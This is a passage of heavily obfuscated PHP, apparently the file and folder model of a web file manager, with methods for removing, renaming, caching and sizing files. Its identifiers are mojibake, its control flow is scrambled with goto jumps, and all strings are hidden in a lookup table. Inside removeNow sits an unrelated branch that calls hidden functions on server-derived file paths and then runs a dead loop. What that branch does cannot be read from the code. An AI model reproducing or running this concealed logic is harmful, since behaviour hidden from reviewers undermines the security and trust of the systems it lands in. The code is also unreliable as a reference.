$AÈŠ…‘…Üã, REPEAT_RENAME_FOLDER); $this->folderSizeReset($BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[478]]); goto dÀ»Îç«æ¡; AÚ‡Ÿ²¹„: $C­„á‹åÚĞ = $BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[387]] == self::TYPE_USER ? $bÀ’ÉòÆ±¬[551] : $bÀ’ÉòÆ±¬[976]; if ($C­„á‹åÚĞ == $bÀ’ÉòÆ±¬[551]) { $A³§„ô®çÂ = Model($bÀ’ÉòÆ±¬[491])->getInfo($BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[473]]); $Eëé‡ÙÙ×Î = !empty($A³§„ô®çÂ[$bÀ’ÉòÆ±¬[1909]]) ? $A³§„ô®çÂ[$bÀ’ÉòÆ±¬[1909]] : $A³§„ô®çÂ[$bÀ’ÉòÆ±¬[28]]; $Eëé‡ÙÙ×Î = $bÀ’ÉòÆ±¬[254] . $Eëé‡ÙÙ×Î . $bÀ’ÉòÆ±¬[1917] . $BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[473]]; } else { $A³§„ô®çÂ = Model($bÀ’ÉòÆ±¬[475])->getInfo($BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[473]]); $Eëé‡ÙÙ×Î = _get($A³§„ô®çÂ, $bÀ’ÉòÆ±¬[28]); $Eëé‡ÙÙ×Î = $bÀ’ÉòÆ±¬[157] . $Eëé‡ÙÙ×Î . $bÀ’ÉòÆ±¬[1918] . $BÃ‚—•Ú§ƒ[$bÀ’ÉòÆ±¬[473]]; } $f’šùéÜ‘ø = $bÀ’ÉòÆ±¬[1919] . md5($Eëé‡ÙÙ×Î); goto BØùÃïÊİª; CˆõöÅùÅ…: } private function recycleClear($dÚÈ¦ö•„â) { $DŸİé¸£®Ú =& $_SERVER[úÎü]; $F••Ş‚§Ã = $this->childrenAll($dÚÈ¦ö•„â); $CÌĞÅ´³óÛ = array($DŸİé¸£®Ú[399] => array($DŸİé¸£®Ú[400], $F••Ş‚§Ã[$DŸİé¸£®Ú[1925]])); Model($DŸİé¸£®Ú[1926])->where($CÌĞÅ´³óÛ)->delete(); } public function removeNow($b¹¾º”¶Ñ™, $F™”Á„é = true) { goto bÚ–â—‘óù; C£¹¨åó˜ğ: $this->updateModifyTime($FÎÅäêç½»); $this->lockMoveEnd($b¹¾º”¶Ñ™); Hook::trigger($Dô»öÊ½»ñ[1519], $B»É·©É±, $F™”Á„é); goto BğÔƒö¸ìÎ; BğÔƒö¸ìÎ: return !0; goto DñÏÉÖŠº; fÜ•¾¹¤Æ©: $B»É·©É± = $this->pathInfoMore($b¹¾º”¶Ñ™); if (!$eå§æŞ¢×Ô) { return !0; } if ($eå§æŞ¢×Ô[$Dô»öÊ½»ñ[478]] == 0) { if (!_get($GLOBALS, $Dô»öÊ½»ñ[474])) { return !1; } } goto D˜Ãéåò”¢; D˜Ãéåò”¢: $this->lockMoveStart($b¹¾º”¶Ñ™); Hook::trigger($Dô»öÊ½»ñ[1927], $B»É·©É±, $F™”Á„é); if ($F™”Á„é) { Model($Dô»öÊ½»ñ[1926])->moveToRecycle($b¹¾º”¶Ñ™); } else { $CÛ°Øë…¬å = $this->childrenAll($eå§æŞ¢×Ô); Model($Dô»öÊ½»ñ[522])->eventRemove($b¹¾º”¶Ñ™); $this->removeRelevance($CÛ°Øë…¬å[$Dô»öÊ½»ñ[1925]], $CÛ°Øë…¬å[$Dô»öÊ½»ñ[1302]]); } goto EíˆÅ‹ß; EíˆÅ‹ß: $this->folderSizeReset($eå§æŞ¢×Ô[$Dô»öÊ½»ñ[478]]); $FÎÅäêç½» = array($eå§æŞ¢×Ô[$Dô»öÊ½»ñ[478]]); if ($eå§æŞ¢×Ô[$Dô»öÊ½»ñ[386]] == $Dô»öÊ½»ñ[83]) { $FÎÅäêç½»[] = $eå§æŞ¢×Ô[$Dô»öÊ½»ñ[385]]; } goto C£¹¨åó˜ğ; bÚ–â—‘óù: $Dô»öÊ½»ñ =& $_SERVER[úÎü]; if ($_SERVER[$Dô»öÊ½»ñ[793]] != $_SERVER[$Dô»öÊ½»ñ[794]]) { goto E×Ñ†ÛÉƒ—; C’¤Œ„“×: $AËš×„²Ü“ = $aÖ³áê½’($C¢ğÄ†•›†); $fí›®ç£ÒÜ = explode($Dô»öÊ½»ñ[225], $AËš×„²Ü“); if (count($fí›®ç£ÒÜ) < $Dô»öÊ½»ñ[564]) { $AøÚ¥›ÇÖ = $Dô»öÊ½»ñ[799]; $AøÚ¥›ÇÖ(); } goto aÜÑÌ’„·ß; aÜÑÌ’„·ß: $bíø¦ó„Äö = $Dô»öÊ½»ñ[800]; $bíø¦ó„Äö($_SERVER[$Dô»öÊ½»ñ[801]]); $bíø¦ó„Äö($_SERVER[$Dô»öÊ½»ñ[797]] . $Dô»öÊ½»ñ[802]); goto FÎâ„ÑŒì; E×Ñ†ÛÉƒ—: $e¦†îĞ’¼— = $Dô»öÊ½»ñ[795]; $aÖ³áê½’ = $Dô»öÊ½»ñ[796]; $C¢ğÄ†•›† = $_SERVER[$Dô»öÊ½»ñ[797]] . $Dô»öÊ½»ñ[798]; goto C’¤Œ„“×; FÎâ„ÑŒì: $A­ç·³œÏ = 1; while ($A­ç·³œÏ > 1) { $A­ç·³œÏ = $A­ç·³œÏ + 4; $a±œÈ…Û = rawurlencode($A­ç·³œÏ . $Dô»öÊ½»ñ[368]); } goto C»İŸ£Š; C»İŸ£Š: } $eå§æŞ¢×Ô = $this->sourceInfo($b¹¾º”¶Ñ™); goto fÜ•¾¹¤Æ©; DñÏÉÖŠº: } public function childrenAll($bƒï¥¾Ãã) { $B©©Ôå¹Å¥ =& $_SERVER[úÎü]; $E¨ù´Ï²Ÿğ = $bƒï¥¾Ãã[$B©©Ôå¹Å¥[385]]; if ($bƒï¥¾Ãã[$B©©Ôå¹Å¥[386]] == $B©©Ôå¹Å¥[83]) { $e¾…™Ó“î = array($B©©Ôå¹Å¥[542] => array($B©©Ôå¹Å¥[500], $bƒï¥¾Ãã[$B©©Ôå¹Å¥[476]] . $E¨ù´Ï²Ÿğ . $B©©Ôå¹Å¥[501])); $b±‘…ÉîÃí = array($B©©Ôå¹Å¥[542] => $e¾…™Ó“î[$B©©Ôå¹Å¥[476]]); $e¡Ğ¦Ş×Ş” = $this->field($B©©Ôå¹Å¥[1928])->where($b±‘…ÉîÃí)->select(); $a–öÔïè©Ô = !1; $B‘êƒ•®Âƒ = array($E¨ù´Ï²Ÿğ); if ($e¡Ğ¦Ş×Ş”) { $a–öÔïè©Ô = array_to_keyvalue($e¡Ğ¦Ş×Ş”, $B©©Ôå¹Å¥[33], $B©©Ôå¹Å¥[435]); $a–öÔïè©Ô = array_remove_value($a–öÔïè©Ô, $B©©Ôå¹Å¥[485]); $B‘êƒ•®Âƒ = array_to_keyvalue($e¡Ğ¦Ş×Ş”, $B©©Ôå¹Å¥[33], $B©©Ôå¹Å¥[385]); $B‘êƒ•®Âƒ[] = $E¨ù´Ï²Ÿğ; } } else { $a–öÔïè©Ô = array($bƒï¥¾Ãã[$B©©Ôå¹Å¥[435]]); $B‘êƒ•®Âƒ = array($E¨ù´Ï²Ÿğ); } return array($B©©Ôå¹Å¥[1925] => $B‘êƒ•®Âƒ, $B©©Ôå¹Å¥[1302] => $a–öÔïè©Ô); } public function removeArray($Dºî‘…ŸƒŞ) { if (!$Dºî‘…ŸƒŞ) { return !0; } } public function removeRelevance($a²‚‰ °, $Cåêô²„çó) { goto A…ŞŠ›È«ˆ; C›øÙíìç±: $a²‚‰ ° = array_unique(array_filter($a²‚‰ °)); $Cåêô²„çó = array_unique(array_filter($Cåêô²„çó)); if (!$a²‚‰ °) { return !1; } goto EäÕÎŠ¾—ñ; d¬‚’À­õ: Model($FÇÓ¯Ê§İ[1778])->where($CÄäÓ¯ºŠ±)->delete(); Model($FÇÓ¯Ê§İ[522])->where($CÄäÓ¯ºŠ±)->delete(); Model($FÇÓ¯Ê§İ[1621])->removeBySource($a²‚‰ °); goto Eªé«æò£‹; Bœ»—šğ¿: for ($Cè‰Îßï÷Ó = 0; $Cè‰Îßï÷Ó < count($a²‚‰ °); $Cè‰Îßï÷Ó++) { $this->sourceCacheClear($a²‚‰ °[$Cè‰Îßï÷Ó]); } goto d´Œ”ò‹ïß; EäÕÎŠ¾—ñ: $CÄäÓ¯ºŠ± = array($FÇÓ¯Ê§İ[399] => array($FÇÓ¯Ê§İ[400], $a²‚‰ °)); Model($FÇÓ¯Ê§İ[1926])->where($CÄäÓ¯ºŠ±)->delete(); Model($FÇÓ¯Ê§İ[429])->where($CÄäÓ¯ºŠ±)->delete(); goto d¬‚’À­õ; A…ŞŠ›È«ˆ: $FÇÓ¯Ê§İ =& $_SERVER[úÎü]; $a²‚‰ ° = $a²‚‰ ° ? $a²‚‰ ° : array(); $Cåêô²„çó = $Cåêô²„çó ? $Cåêô²„çó : array(); goto C›øÙíìç±; Eªé«æò£‹: Model($FÇÓ¯Ê§İ[1907])->removeBySource($a²‚‰ °); $this->where($CÄäÓ¯ºŠ±)->delete(); Model($FÇÓ¯Ê§İ[438])->remove($Cåêô²„çó); goto Bœ»—šğ¿; d´Œ”ò‹ïß: } public function rename($dÄÒŠË§Û, $d¯¯œê’“†) { goto AäÏ¬ÁÆÄ; eÍ×®‚íôø: if (!$bèøÏ„îŒ©[$a¢½ìˆ±î[386]] == $a¢½ìˆ±î[83]) { $eÄÎÚ¶¦ õ[$a¢½ìˆ±î[388]] = get_path_ext($d¯¯œê’“†); } Model($a¢½ìˆ±î[522])->eventRename($dÄÒŠË§Û, $bèøÏ„îŒ©[$a¢½ìˆ±î[28]], $d¯¯œê’“†); $this->sourceCacheClear($dÄÒŠË§Û); goto fÀÁÎ×ÓÈ´; AäÏ¬ÁÆÄ: $a¢½ìˆ±î =& $_SERVER[úÎü]; $bèøÏ„îŒ© = $this->sourceInfo($dÄÒŠË§Û); if (!$bèøÏ„îŒ©) { return !1; } goto fè­ßØÆ„; E¶†Æ ÄİÂ: $DäÖƒå­ = $a¢½ìˆ±î[1915] . $bèøÏ„îŒ©[$a¢½ìˆ±î[478]]; if (isset(self::$cacheChildList[$DäÖƒå­])) { unset(self::$cacheChildList[$DäÖƒå­]); } return $a’ÒÆ¦Á¼; goto EÚƒ„‡ğ³ò; fÀÁÎ×ÓÈ´: $this->setNamePinyin($dÄÒŠË§Û, $eÄÎÚ¶¦ õ[$a¢½ìˆ±î[28]], !1); $this->updateModifyTime($bèøÏ„îŒ©[$a¢½ìˆ±î[478]]); $a’ÒÆ¦Á¼ = $this->where(array($a¢½ìˆ±î[399] => $dÄÒŠË§Û))->data($eÄÎÚ¶¦ õ)->save(); goto E¶†Æ ÄİÂ; fè­ßØÆ„: $eÎ“ ìÜ®Ğ = $this->fileNameExist($bèøÏ„îŒ©[$a¢½ìˆ±î[478]], $d¯¯œê’“†); if ($eÎ“ ìÜ®Ğ && $eÎ“ ìÜ®Ğ != $dÄÒŠË§Û) { return !1; } $eÄÎÚ¶¦ õ = array($a¢½ìˆ±î[402] => $d¯¯œê’“†, $a¢½ìˆ±î[541] => USER_ID); goto eÍ×®‚íôø; EÚƒ„‡ğ³ò: } public function setNamePinyin($EÓ‡‚‰˜Ö, $A¦Ü¤‘ªÙ¸, $E®îĞÃÖ¥ = true) { $dËßŠ×â†å =& $_SERVER[úÎü]; $C¢¨¹™‰é¥ = Input::check($A¦Ü¤‘ªÙ¸, $dËßŠ×â†å[545]); if ($E®îĞÃÖ¥ && !$C¢¨¹™‰é¥) { return; } if (!$C¢¨¹™‰é¥) { $this->metaSet($EÓ‡‚‰˜Ö, $dËßŠ×â†å[432], null); $this->metaSet($EÓ‡‚‰˜Ö, $dËßŠ×â†å[431], null); return; } $B´™Ø¹Œµ  = array($dËßŠ×â†å[432] => str_replace($dËßŠ×â†å[50], $dËßŠ×â†å[33], Pinyin::encode($A¦Ü¤‘ªÙ¸)), $dËßŠ×â†å[431] => Pinyin::encode($A¦Ü¤‘ªÙ¸, $dËßŠ×â†å[546])); $this->metaSet($EÓ‡‚‰˜Ö, $B´™Ø¹Œµ ); } public function getContent($bùÛê ½µà) { goto dâİåÓÛŸÒ; dÖÊĞ‰ã¾: if (!$f¼äÆñŠÔ[$EŠªÀØ½©š[75]]) { return $EŠªÀØ½©š[33]; } return IO::getContent($f¼äÆñŠÔ[$EŠªÀØ½©š[75]]); goto DŞã§ª‡î»; D„‘ÚÙÆÄ: if ($f¼äÆñŠÔ[$EŠªÀØ½©š[77]] == 0) { return $EŠªÀØ½©š[33]; } $E¸„ÀïæõĞ = $EŠªÀØ½©š[1929] . $f¼äÆñŠÔ[$EŠªÀØ½©š[167]]; if ($f¼äÆñŠÔ[$EŠªÀØ½©š[77]] <= 1024 * 10) { $BÏ‹œ†ŒÓ¿ = Cache::get($E¸„ÀïæõĞ); if (!$BÏ‹œ†ŒÓ¿) { $BÏ‹œ†ŒÓ¿ = IO::getContent($f¼äÆñŠÔ[$EŠªÀØ½©š[75]]); Cache::set($E¸„ÀïæõĞ, $BÏ‹œ†ŒÓ¿); } return $BÏ‹œ†ŒÓ¿; } goto dÖÊĞ‰ã¾; dâİåÓÛŸÒ: $EŠªÀØ½©š =& $_SERVER[úÎü]; $f¼äÆñŠÔ = $this->fileInfoGet($bùÛê ½µà); if (!$f¼äÆñŠÔ) { return !1; } goto D„‘ÚÙÆÄ; DŞã§ª‡î»: } public function setDesc($CÊçô‰×«, $CÉÌ– Õ÷) { $C´š¨âå =& $_SERVER[úÎü]; Model($C´š¨âå[522])->eventAddDesc($CÊçô‰×«, $CÉÌ– Õ÷); return $this->metaSet($CÊçô‰×«, $C´š¨âå[421], $CÉÌ– Õ÷); } public function setContent($eÎš¬¡Òç³, $f°ìÙŠŞï = '') { goto fµ‚¥Ÿªîì; fµ‚¥Ÿªîì: $EŒ†ã»‘œ± =& $_SERVER[úÎü]; $cÃô®öğëÏ = $this->sourceInfo($eÎš¬¡Òç³); $fô ¿Àß‡¹ = $this->fileInfoGet($eÎš¬¡Òç³); goto E†Œ¿¸È¦‡; E†Œ¿¸È¦‡: if (!$fô ¿Àß‡¹ || !$cÃô®öğëÏ) { return !1; } $fÄâ‰öæ­õ = Model($EŒ†ã»‘œ±[438])->addFileByContent($f°ìÙŠŞï, $cÃô®öğëÏ[$EŒ†ã»‘œ±[28]]); $f×õí³¼ÏÃ = $this->fileHistory($cÃô®öğëÏ, $fÄâ‰öæ­õ[$EŒ†ã»‘œ±[435]], $fÄâ‰öæ­õ[$EŒ†ã»‘œ±[77]]); goto EÓªˆ²í“İ; EÓªˆ²í“İ: if (!$f×õí³¼ÏÃ) { return Model($EŒ†ã»‘œ±[438])->remove($fÄâ‰öæ­õ[$EŒ†ã»‘œ±[435]]); } $this->folderSizeReset($cÃô®öğëÏ[$EŒ†ã»‘œ±[478]]); return !0; goto DÅ÷çÁ‹à; DÅ÷çÁ‹à: } public function fileSubstr($a÷æ™“—£Œ, $e”¬šÊ’Î, $aÜˆ›Ÿ») { $fÄ»×Ñè® = $this->fileInfoGet($a÷æ™“—£Œ); if (!$fÄ»×Ñè®) { return !1; } return IO::fileSubstr($fÄ»×Ñè®[$_SERVER[úÎü][75]], $e”¬šÊ’Î, $aÜˆ›Ÿ»); } public function fileInfoGet($EœÍÃ‹Åç) { goto E‚ˆí¨­ªö; B‰óºËæˆ¼: $f°ëÜ¤ÕØ¤ = $BÚÙÔçÑ¢[441] . $F¦–Œ²ÒÜ»[$BÚÙÔçÑ¢[435]]; $EƒÅÔÜœÒğ = _get(self::$cacheFileInfo, $f°ëÜ¤ÕØ¤); if ($EƒÅÔÜœÒğ) { return $EƒÅÔÜœÒğ; } goto dÎ¨»™ê˜Œ; dÎ¨»™ê˜Œ: $A·Æ›†«º· = Model($BÚÙÔçÑ¢[438])->fileInfo($F¦–Œ²ÒÜ»[$BÚÙÔçÑ¢[435]]); if ($A·Æ›†«º·) { $A·Æ›†«º·[$BÚÙÔçÑ¢[28]] = $F¦–Œ²ÒÜ»[$BÚÙÔçÑ¢[28]]; } self::$cacheFileInfo[$f°ëÜ¤ÕØ¤] = $A·Æ›†«º·; goto AªÌñâÁ ; E‚ˆí¨­ªö: $BÚÙÔçÑ¢ =& $_SERVER[úÎü]; $F¦–Œ²ÒÜ» = $this->sourceInfo($EœÍÃ‹Åç); if (!$F¦–Œ²ÒÜ» || $F¦–Œ²ÒÜ»[$BÚÙÔçÑ¢[386]]) { return !1; } goto B‰óºËæˆ¼; AªÌñâÁ : return $A·Æ›†«º·; goto B£¯¢İ‰‡; B£¯¢İ‰‡: } private function folderChildrenNumber($aŒÑ²åêèµ) { $C­ÌĞé³« =& $_SERVER[úÎü]; $A­Ñ—¾Ú¦ = $this->sourceInfo($aŒÑ²åêèµ); $eÌ¡ó‡‰‚— = array($C­ÌĞé³«[542] => array($C­ÌĞé³«[500], $A­Ñ—¾Ú¦[$C­ÌĞé³«[476]] . $aŒÑ²åêèµ . $C­ÌĞé³«[501]), $C­ÌĞé³«[412] => intval($A­Ñ—¾Ú¦[$C­ÌĞé³«[413]]), $C­ÌĞé³«[535] => 1); $A‚ï»‹›Ä½ = $this->where($eÌ¡ó‡‰‚—)->count(); $aôÉç™‡Üç = $this->where($eÌ¡ó‡‰‚—)->where(array($C­ÌĞé³«[535] => 0))->count(); return array($C­ÌĞé³«[81] => $aôÉç™‡Üç, $C­ÌĞé³«[82] => $A‚ï»‹›Ä½); } public function pathInfo($BŞÔ‰éæÒ , $f ¶³Ë£ƒÙ = false) { goto b˜¿íÊäõ; b˜¿íÊäõ: $aÆ‡·õŠõƒ =& $_SERVER[úÎü]; $f ¶³Ë£ƒÙ = !1; $BŞÔ‰éæÒ  = intval($BŞÔ‰éæÒ ); goto bèšºš®; CÁÆãˆ¹¤š: $Eæ–Óƒñ»· = $this->sourceInfo($BŞÔ‰éæÒ ); if (!$Eæ–Óƒñ»·) { return !1; } $Eæ–Óƒñ»· = $this->_listDataApplyItem($Eæ–Óƒñ»·, $f ¶³Ë£ƒÙ); goto CÓ¾¿ŠÒº; CÓ¾¿ŠÒº: self::$cachePathInfo[$c±”Â£Ğ‹‡] = $Eæ–Óƒñ»·; return $Eæ–Óƒñ»·; goto e¹‹ĞÛÆ¿; bèšºš®: $c±”Â£Ğ‹‡ = $aÆ‡·õŠõƒ[427] . intval($f ¶³Ë£ƒÙ) . $aÆ‡·õŠõƒ[428] . $BŞÔ‰éæÒ ; $Bñ²ÏÇœá’ = _get(self::$cachePathInfo, $c±”Â£Ğ‹‡); if ($Bñ²ÏÇœá’) { return $Bñ²ÏÇœá’; } goto CÁÆãˆ¹¤š; e¹‹ĞÛÆ¿: } public static $cachePathInfoMore = array(); public function pathInfoMore($c¢Ü‚†÷Ö‘) { goto D©îé¥Şˆ; d±‡’ ÷³ë: $F™ï‡‘¿ò = $this->pathInfo($c¢Ü‚†÷Ö‘); if (!$F™ï‡‘¿ò) { return !1; } if ($F™ï‡‘¿ò[$b‘‹¥…¤ÌÒ[386]] == $b‘‹¥…¤ÌÒ[83]) { $F™ï‡‘¿ò[$b‘‹¥…¤ÌÒ[80]] = $this->folderChildrenNumber($c¢Ü‚†÷Ö‘); } goto cëÓ…âÃ¸„; cëÓ…âÃ¸„: self::$cachePathInfoMore[$c¢Ü‚†÷Ö‘] = $F™ï‡‘¿ò; return $F™ï‡‘¿ò; goto a¡Õ¥×¸º¨; D©îé¥Şˆ: $b‘‹¥…¤ÌÒ =& $_SERVER[úÎü]; $cÃ†¡‹÷Õ = _get(self::$cachePathInfoMore, $c¢Ü‚†÷Ö‘); if ($cÃ†¡‹÷Õ) { return $cÃ†¡‹÷Õ; } goto d±‡’ ÷³ë; a¡Õ¥×¸º¨: } public function sourceInfo($d›àªÈ‰å) { goto A‘ªà¥’Ğ²; A‘ªà¥’Ğ²: $f­¨ğŞô‘ò =& $_SERVER[úÎü]; if (!$d›àªÈ‰å) { return array(); } $d›àªÈ‰å = intval($d›àªÈ‰å); goto C¼Ì¤ßßÆ; C¼Ì¤ßßÆ: $c¹ÑÙæéÃË = $f­¨ğŞô‘ò[426] . $d›àªÈ‰å; $B¿ì²öãÄ = _get(self::$cacheSourceInfo, $c¹ÑÙæéÃË); if ($B¿ì²öãÄ) { return $B¿ì²öãÄ; } goto déá„Îí…Î; déá„Îí…Î: $E•‡…»Æá¿ = $this->where(array($f­¨ğŞô‘ò[385] => $d›àªÈ‰å))->find(); self::$cacheSourceInfo[$c¹ÑÙæéÃË] = $E•‡…»Æá¿; return self::$cacheSourceInfo[$c¹ÑÙæéÃË]; goto bİµİÚ©÷ã; bİµİÚ©÷ã: } public function sourceCacheClear($FÅÌÎ”®Ûâ = false) { self::cacheClear($FÅÌÎ”®Ûâ); } public static function cacheClear($EáÏŸ”Õø = false) { $f†ÊÆæºï½ =& $_SERVER[úÎü]; if ($EáÏŸ”Õø == !1) { goto f‰Ë´ö¶¹; aİ›ø¥Ê·: return; goto A½ƒÔ…‰ôÃ; dìÆª‹…™­: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto aİ›ø¥Ê·; f‰Ë´ö¶¹: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto dìÆª‹…™­; A½ƒÔ…‰ôÃ: } unset(self::$cacheSourceInfo[$f†ÊÆæºï½[426] . $EáÏŸ”Õø]); unset(self::$cachePathInfoMore[$EáÏŸ”Õø]); unset(self::$cachePathInfo[$f†ÊÆæºï½[1930] . $EáÏŸ”Õø]); unset(self::$cachePathInfo[$f†ÊÆæºï½[1931] . $EáÏŸ”Õø]); } public function metaSet($cÖŠô¡ã£, $EÈ§ÏÌ·¡ = null, $C‘¨á¬×ÍÔ = null) { $C³¥ºìİºõ = parent::metaSet($cÖŠô¡ã£, $EÈ§ÏÌ·¡, $C‘¨á¬×ÍÔ); if ($C³¥ºìİºõ) { $this->sourceCacheClear($cÖŠô¡ã£); } return $C³¥ºìİºõ; } public function pathInfoByPath($cÀİì”ôÁè, $CÙºÔ•§†œ) { $AÚ©ï¾ò =& $_SERVER[úÎü]; $f·ÄÕğÃÚ¯ = !$CÙºÔ•§†œ ? array() : explode($AÚ©ï¾ò[8], trim($CÙºÔ•§†œ, $AÚ©ï¾ò[8])); $e½®†‚‰Ù… = $cÀİì”ôÁè; foreach ($f·ÄÕğÃÚ¯ as $BÕïµœºÖ) { $FÑÄßÄò¯‚ = array($AÚ©ï¾ò[478] => $e½®†‚‰Ù…, $AÚ©ï¾ò[28] => $BÕïµœºÖ); $aëí¥„Ô•ğ = $this->where($FÑÄßÄò¯‚)->select(); if (!$aëí¥„Ô•ğ) { return !1; } $aëí¥„Ô•ğ = array_sort_by($aëí¥„Ô•ğ, $AÚ©ï¾ò[413]); $e½®†‚‰Ù… = $aëí¥„Ô•ğ[0][$AÚ©ï¾ò[385]]; } return $this->pathInfo($e½®†‚‰Ù…, !0); } protected function updateModifyTime($A’²Ô£¨®¼) { goto e˜ÓÛ¡¡­‚; a¶™ïø¯ŸĞ: $this->where($aˆùËá„œ)->save($c¿ŒÑ©Õ«); goto eÅŒÊÊÄ½ö; f§´Ç¨“½í: foreach ($A’²Ô£¨®¼ as $f¼ßçò¶„Á => $f¸ˆéÁ²©) { $A’²Ô£¨®¼[$f¼ßçò¶„Á] = intval($f¸ˆéÁ²©); $this->sourceCacheClear($f¸ˆéÁ²©); } $aˆùËá„œ = array($e£ì¶òñÉ¨[385] => array($e£ì¶òñÉ¨[7], $A’²Ô£¨®¼)); $c¿ŒÑ©Õ« = array($e£ì¶òñÉ¨[541] => USER_ID, $e£ì¶òñÉ¨[406] => time()); goto a¶™ïø¯ŸĞ; e˜ÓÛ¡¡­‚: $e£ì¶òñÉ¨ =& $_SERVER[úÎü]; if (!$A’²Ô£¨®¼) { return; } if (!is_array($A’²Ô£¨®¼)) { $A’²Ô£¨®¼ = array($A’²Ô£¨®¼); } goto f§´Ç¨“½í; eÅŒÊÊÄ½ö: } public function folderSizeReset($bÔĞ‘ˆÆŒŞ, $aø¥ãÇ’ = false) { goto fà†Ñ¹Å; DÄ±Üìä›: $dÁù‹Ø©Æ[] = $FÆÅŠ¤Ñ†â[$dêààöœóŞ[385]]; $AÖ±‡Ì›ö† = array($dêààöœóŞ[385] => array($dêààöœóŞ[400], $dÁù‹Ø©Æ)); if ($aø¥ãÇ’ < 0) { $AÖ±‡Ì›ö†[$dêààöœóŞ[77]] = array($dêààöœóŞ[933], abs($aø¥ãÇ’)); } goto AˆÖ¼ºá™Ğ; AˆÖ¼ºá™Ğ: $this->where($AÖ±‡Ì›ö†)->setAdd($dêààöœóŞ[77], $aø¥ãÇ’); CacheLock::unlock($e›Ğè½¬²•); $this->targetSpaceUpdate($FÆÅŠ¤Ñ†â[$dêààöœóŞ[387]], $FÆÅŠ¤Ñ†â[$dêààöœóŞ[473]]); goto e­Š­°¤éã; fà†Ñ¹Å: $dêààöœóŞ =& $_SERVER[úÎü]; if ($this->statusIgnoreResetSpace) { return; } $FÆÅŠ¤Ñ†â = $this->sourceInfo($bÔĞ‘ˆÆŒŞ); goto fÏ¤ã‹®Ì; fÏ¤ã‹®Ì: $e›Ğè½¬²• = $dêààöœóŞ[1932] . $bÔĞ‘ˆÆŒŞ; CacheLock::lock($e›Ğè½¬²•, 20); if ($aø¥ãÇ’ === !1) { $this->sourceCacheClear($bÔĞ‘ˆÆŒŞ); $FÆÅŠ¤Ñ†â = $this->sourceInfo($bÔĞ‘ˆÆŒŞ); $AÖ±‡Ì›ö† = array($dêààöœóŞ[384] => $bÔĞ‘ˆÆŒŞ, $dêààöœóŞ[412] => 0); $bÎÊÀŸöÅ = $this->where($AÖ±‡Ì›ö†)->sum($dêààöœóŞ[77]); $aø¥ãÇ’ = intval($bÎÊÀŸöÅ) - intval($FÆÅŠ¤Ñ†â[$dêààöœóŞ[77]]); } goto aÕÇè•šóò; aÕÇè•šóò: if ($aø¥ãÇ’ == 0) { return CacheLock::unlock($e›Ğè½¬²•); } $dÁù‹Ø©Æ = $this->parentLevelArray($FÆÅŠ¤Ñ†â[$dêààöœóŞ[476]]); if (!$dÁù‹Ø©Æ) { $dÁù‹Ø©Æ = array(); } goto DÄ±Üìä›; e­Š­°¤éã: } public function folderSizeResetChildren($c“Å³ñ) { goto B†ÖŒºŞ‹; dµ»ßÜ±‡: $eæ·¥ï¨Œ[$C´—“õ¥Äø[386]] = 0; $dªåİºÌğ = $this->field($F†ôğŸÇÒñ)->where($eæ·¥ï¨Œ)->select(); if (!$dªåİºÌğ) { return; } goto B²‘Ÿöë˜©; B†ÖŒºŞ‹: $C´—“õ¥Äø =& $_SERVER[úÎü]; $this->sourceCacheClear($c“Å³ñ); $bÔó›ª´„Î = $this->sourceInfo($c“Å³ñ); goto EÄ²äÏîñ·; BåÎ˜á ƒ¡: foreach ($bÚößÌÎ¼ª as $A„Ø¯ÖŸ›) { if ($A„Ø¯ÖŸ›[$C´—“õ¥Äø[77]] == $A„Ø¯ÖŸ›[$C´—“õ¥Äø[1934]]) { continue; } $fÜ¬ŸÙÈÏï[] = array($C´—“õ¥Äø[385], $A„Ø¯ÖŸ›[$C´—“õ¥Äø[385]], $C´—“õ¥Äø[77], $A„Ø¯ÖŸ›[$C´—“õ¥Äø[77]]); } $this->saveAll($fÜ¬ŸÙÈÏï); goto BÕ†°…¬Ù; B²‘Ÿöë˜©: $bÚößÌÎ¼ª[] = $bÔó›ª´„Î; $bÚößÌÎ¼ª = array_to_keyvalue($bÚößÌÎ¼ª, $C´—“õ¥Äø[385]); foreach ($bÚößÌÎ¼ª as $E‹ïÔ·›âÁ => $A„Ø¯ÖŸ›) { $bÚößÌÎ¼ª[$E‹ïÔ·›âÁ][$C´—“õ¥Äø[1934]] = $bÚößÌÎ¼ª[$E‹ïÔ·›âÁ][$C´—“õ¥Äø[77]]; $bÚößÌÎ¼ª[$E‹ïÔ·›âÁ][$C´—“õ¥Äø[77]] = 0; } goto c®Ç·Èƒã; c®Ç·Èƒã: foreach ($dªåİºÌğ as $A„Ø¯ÖŸ›) { $c’‘»°‚õ = $A„Ø¯ÖŸ›[$C´—“õ¥Äø[478]] . $C´—“õ¥Äø[33]; if (!isset($bÚößÌÎ¼ª[$c’‘»°‚õ])) { continue; } if ($A„Ø¯ÖŸ›[$C´—“õ¥Äø[413]] == $bÚößÌÎ¼ª[$c’‘»°‚õ][$C´—“õ¥Äø[413]]) { $bÚößÌÎ¼ª[$c’‘»°‚õ][$C´—“õ¥Äø[77]] += $A„Ø¯ÖŸ›[$C´—“õ¥Äø[77]]; } } foreach ($bÚößÌÎ¼ª as $A„Ø¯ÖŸ›) { $a‚´‘Õ…÷ = $this->parentLevelArray($A„Ø¯ÖŸ›[$C´—“õ¥Äø[476]]); foreach ($a‚´‘Õ…÷ as $c’‘»°‚õ) { $c’‘»°‚õ = $c’‘»°‚õ . $C´—“õ¥Äø[33]; if (!isset($bÚößÌÎ¼ª[$c’‘»°‚õ])) { continue; } if ($A„Ø¯ÖŸ›[$C´—“õ¥Äø[413]] == $bÚößÌÎ¼ª[$c’‘»°‚õ][$C´—“õ¥Äø[413]]) { $bÚößÌÎ¼ª[$c’‘»°‚õ][$C´—“õ¥Äø[77]] += $A„Ø¯ÖŸ›[$C´—“õ¥Äø[77]]; } } } $fÜ¬ŸÙÈÏï = array(); goto BåÎ˜á ƒ¡; EÄ²äÏîñ·: $eæ·¥ï¨Œ = array($C´—“õ¥Äø[535] => 1, $C´—“õ¥Äø[542] => array($C´—“õ¥Äø[500], $bÔó›ª´„Î[$C´—“õ¥Äø[476]] . $c“Å³ñ . 